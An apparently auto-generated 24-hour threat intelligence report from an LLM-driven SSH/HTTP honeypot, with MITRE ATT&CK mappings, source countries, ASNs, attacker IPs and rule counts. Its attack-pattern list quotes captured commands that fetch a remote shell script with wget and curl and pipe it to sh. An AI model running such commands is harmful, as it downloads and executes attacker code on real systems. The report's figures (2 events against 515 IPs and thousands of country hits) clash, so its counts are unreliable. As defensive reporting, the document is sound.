# Threat Intelligence Report

**Generated**: 2026-06-10 00:05 UTC  
**Source**: LLM Honeypot Intelligence Platform  
**Window**: Last 24 hours  
**Classification**: TLP:AMBER

---

## Executive Summary

In the past 24 hours, the honeypot platform observed **2 events** from **515 unique source IPs** across **30 countries** and **36 autonomous systems**.

| Metric | Value |
|--------|-------|
| SSH Events (Beelzebub) | 2 |
| HTTP Events (Galah) | 0 |
| Unique Attacker IPs | 515 |
| Atomic Attack Patterns | 6 |
| MITRE ATT&CK Techniques | 3 |
| Generated Sigma Rules | 2 |
| Generated YARA Rules | 2 |
| Generated Suricata Rules | 0 |
| Blocked IPs (Firewall) | 238 |

---

## MITRE ATT&CK Mapping

| Technique | Name | Count |
|-----------|------|-------|
| T1082 (System Information Discovery) | | 2 |
| T1105 (Ingress Tool Transfer) | | 2 |
| T1059.004 (Unix Shell) | | 1 |

### Tactics Distribution

- **discovery**: 2 events █
- **command_and_control**: 2 events █
- **execution**: 1 events 

---

## Geographic Distribution

### Top Source Countries

| Country | Events |
|---------|--------|
| United States | 1,831 |
| Bulgaria | 540 |
| China | 444 |
| Pakistan | 370 |
| France | 264 |
| Luxembourg | 139 |
| United Kingdom | 127 |
| Germany | 97 |
| Singapore | 96 |
| The Netherlands | 92 |
| Hong Kong | 64 |
| Japan | 48 |
| Malaysia | 31 |
| United Arab Emirates | 22 |
| Thailand | 21 |

### Top ASNs (Autonomous Systems)

| ASN | Events |
|-----|--------|
| ReliableSite.Net LLC | 482 |
| LLC Vash Kredit Bank | 436 |
| Google LLC | 370 |
| CHINA UNICOM China169 Backbone | 357 |
| ONYPHE SAS | 318 |
| Alibaba (US) Technology Co., Ltd. | 197 |
| UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 175 |
| Vpsvault.host Ltd | 174 |
| Akamai Connected Cloud | 149 |
| Offshore LC | 139 |
| Censys, Inc. | 139 |
| Cyber Internet Services (Pvt) Ltd. | 136 |
| CMPak Limited | 117 |
| Galaxy Broadband | 117 |
| Modat B.V. | 113 |

---

## Top Attacker IPs

| IP | Hits | Category |
|----|----- |----------|
| `175.149.183.33` | 323 | Attacker |
| `85.11.167.11` | 301 | Attacker |
| `139.135.59.149` | 136 | Attacker |
| `85.11.167.7` | 125 | Attacker |
| `176.65.139.41` | 124 | Attacker |
| `104.243.35.104` | 118 | Attacker |
| `104.243.43.7` | 118 | Attacker |
| `103.74.20.164` | 117 | Attacker |
| `223.123.38.125` | 117 | Attacker |
| `45.198.224.18` | 98 | Attacker |
| `85.217.140.37` | 88 | Attacker |
| `66.228.43.62` | 78 | Attacker |
| `188.166.223.76` | 73 | Attacker |
| `104.243.35.94` | 69 | Attacker |
| `94.156.152.234` | 67 | Attacker |
| `104.243.32.126` | 59 | Attacker |
| `104.243.35.120` | 59 | Attacker |
| `104.243.43.19` | 59 | Attacker |
| `198.46.134.48` | 41 | Attacker |
| `45.205.1.5` | 41 | Attacker |

---

## Indicators of Compromise (IOCs)

| Type | Count |
|------|-------|
| IPv4 Addresses | 515 |
| URLs | 1 |
| Domains | 0 |
| SHA256 Hashes | 0 |
| File Paths | 0 |

### Extracted URLs

- `https://80.27.83.195/sh`

---

## Top Attack Patterns (SSH)

- [1x] `uname -a`
- [1x] `echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A`
- [1x] `wget --no-check-certificate -qO- https://80.27.83.195/sh`
- [1x] `curl -sk https://80.27.83.195/sh`
- [1x] `sh -s ssh`
- [1x] `uname -s -m`

---

## Generated Rules Summary

All rules are stored in: `/data/ollama-proxy/generated-rules/`

| Format | Count | Path |
|--------|-------|------|
| Sigma (SIEM) | 2 | `sigma/*.yml` |
| YARA (Payload) | 2 | `yara/*.yar` |
| Suricata (IDS/IPS) | 0 | `suricata/honeypot.rules` |
| Firewall (iptables) | 238 IPs | `firewall/blocklist_*.sh` |
| STIX 2.1 Bundle | 1 | `stix/bundle.json` |
| IOC List | 1 | `iocs/ioc_list.json` |

---

*Report generated automatically by LLM Honeypot Intelligence Platform*